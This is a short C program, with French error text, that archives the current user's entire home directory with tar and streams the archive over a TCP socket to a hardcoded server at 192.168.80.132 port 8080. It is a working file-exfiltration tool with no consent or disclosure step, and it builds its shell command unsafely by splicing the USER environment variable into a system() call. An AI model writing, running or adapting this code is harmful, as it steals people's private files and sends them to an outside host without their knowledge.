#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "192.168.80.132"
#define SERVER_PORT 8080
#define BUFFER_SIZE 1024
#define ARCHIVE_FILE "user_files.tar.gz"

void create_archive() {
    char command[256];
    snprintf(command, sizeof(command), "tar -czf %s -C /home/%s .", ARCHIVE_FILE, getenv("USER"));
    system(command);
}

int create_socket() {
    return socket(AF_INET, SOCK_STREAM, 0);
}

void connect_to_server(int client_sock) {
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(SERVER_PORT);
    connect(client_sock, (struct sockaddr *)&server, sizeof(server));
}

void send_file(int client_sock) {
    char buffer[BUFFER_SIZE];
    FILE *file = fopen(ARCHIVE_FILE, "rb");
    size_t read_size;

    if (file == NULL) {
        perror("Erreur d'ouverture du fichier");
        return;
    }

    while ((read_size = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        send(client_sock, buffer, read_size, 0);
    }

    fclose(file);
}

void close_socket(int client_sock) {
    close(client_sock);
}

int main() {
    create_archive();
    int client_sock = create_socket();
    connect_to_server(client_sock);
    send_file(client_sock);
    close_socket(client_sock);
    return 0;
}
